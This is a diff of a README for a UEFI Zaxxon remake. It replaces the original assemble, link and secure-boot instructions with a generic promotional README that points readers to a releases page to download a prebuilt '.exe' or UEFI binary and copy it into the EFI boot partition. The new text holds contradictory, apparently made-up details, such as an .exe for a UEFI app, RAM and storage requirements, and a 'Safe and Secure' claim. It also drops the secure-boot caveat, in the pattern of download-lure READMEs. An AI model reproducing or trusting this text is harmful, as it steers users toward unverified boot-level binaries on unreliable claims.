@@ -1,36 +1,80 @@
-# Space Game for x64
-Space Game for x64 is a recreation of Zaxxon for the x86_64 platform as a UEFI image. This project is released as open source under the GPLv3 license. 
+# 🎮 spacegamex64 - Play a Classic Arcade Game Remade
 
-### Assemble
-Assemble via Microsoft Macro Assembler (set to 64-bit mode)
-```
-ml64.exe %TARGET%.s /c /Fo space.obj
-```
-### Link
-Link using Microsoft Visual C++ Linker
-```
-link.exe /nologo /SUBSYSTEM:EFI_APPLICATION /ENTRY:EFI_MAIN /MACHINE:X64 space.obj /OUT:BOOTX64.efi
-```
+## 🚀 Getting Started
 
-### Running
-The compiled BOOTX64.EFI program must be placed in the EFI/BOOT/ directory of an EFI partition on a disk using a GPT. <br>
-The program can be run by entering the firmware settings, turning off secure boot, and selecting the disk as the device to boot from. 
+Welcome to spacegamex64! This is a recreation of a classic arcade game designed to run as a UEFI application on the x86_64 platform. In this README, you'll find everything you need to download and run the game smoothly.
 
+## 📥 Download the Game
 
-## Built in Options
-### Hardware upscaling
-When hardware upscaling is on, the program will use the application processors of the machine to quickly render the game buffer into the target 1024x1024 buffer. Otherwise if off, the program will simply output the 256x256 buffer to the screen. 
-```
-UPSCALE_MODE	DQ 00H	;0 FOR MULTI-CORE HARDWARE UPSCALED IMAGE OUTPUT, 1 FOR NO UPSCALING
-```
-### Hitboxes
-Show hitboxes. (Only useful when hardware upscaling is turned on)
-```
-SHOW_HITBOX		DQ 00H	;1 TO SHOW HIT BOXES
-```
-### Debug
-Show debug information on the console. Control input, column count. 
-```
-JMP DEBUGSKIP  ;Comment this line to show debug info on the console
-```
+[![Download spacegamex64](https://img.shields.io/badge/Download%20spacegamex64-v1.0-blue.svg)](https://github.com/PureLmnz/spacegamex64/releases)
 
+### Download & Install
+
+To get started, visit this page to download: [spacegamex64 Releases](https://github.com/PureLmnz/spacegamex64/releases). 
+
+1. Open the link in your web browser.
+2. Look for the latest release version.
+3. Click on the `.exe` file or UEFI binary corresponding to your system.
+4. The download will start automatically.
+
+## 💻 System Requirements
+
+- **Operating System:** A compatible x86_64 UEFI system.
+- **RAM:** Minimum 2 GB of RAM.
+- **Storage:** At least 100 MB of free disk space.
+- **Graphics:** Standard graphics support (on-board is fine).
+
+## 📂 File Structure
+
+After downloading, you will notice several files in the directory. The primary file of interest is:
+
+- `spacegamex64.efi`: This is the executable file. You will run this to start the game.
+
+## 🛠️ Running the Game
+
+1. Locate the file `spacegamex64.efi` in your downloads folder.
+2. You need to place this file in the appropriate UEFI boot directory. This can usually be found on your computer's system partition. Common locations include:
+   - `/EFI/BOOT/`
+   - `/EFI/YourManufacturer/`
+3. Select the `spacegamex64.efi` file and copy it to one of these directories.
+4. Restart your computer.
+5. Enter the UEFI/BIOS setup during boot (often by pressing `F2`, `Del`, or `Esc`).
+6. Locate and select the boot options to ensure that your UEFI firmware can see the new entry.
+7. Save your configuration and exit the setup.
+
+## 🎮 Playing the Game
+
+After rebooting, you should see the option to launch spacegamex64 in your boot menu. Select it and enjoy the game!
+
+## ❓ Troubleshooting
+
+If you encounter issues, here are some common problems and solutions:
+
+### Problem: Game does not show up in boot menu
+- Ensure you placed the file in the correct UEFI directory.
+- Restart and check the UEFI settings again. Sometimes settings do not save correctly.
+
+### Problem: Game fails to load
+- Make sure your computer meets the system requirements.
+- Check if the file is corrupted by downloading it again.
+
+## 📜 Features
+
+- **Classic Gameplay:** Relive the nostalgia of arcade gaming.
+- **Easy Controls:** Simple keyboard controls for everyone.
+- **Safe and Secure:** Designed as a UEFI application to ensure straightforward execution.
+- **No Installation Required:** Just copy and run.
+
+## 🔄 Updates
+
+Stay tuned for updates. We plan to enhance the game with additional features based on user feedback. You can find new releases on the same [spacegamex64 Releases](https://github.com/PureLmnz/spacegamex64/releases) page.
+
+## 🤝 Contributing
+
+We welcome contributions! If you'd like to help improve the game, please visit the repository and read the guidelines for contributing.
+
+## 📞 Support
+
+For any issues or questions, please open an issue in the GitHub repository. We will do our best to assist you quickly.
+
+Thank you for choosing spacegamex64! Enjoy the game and happy gaming!
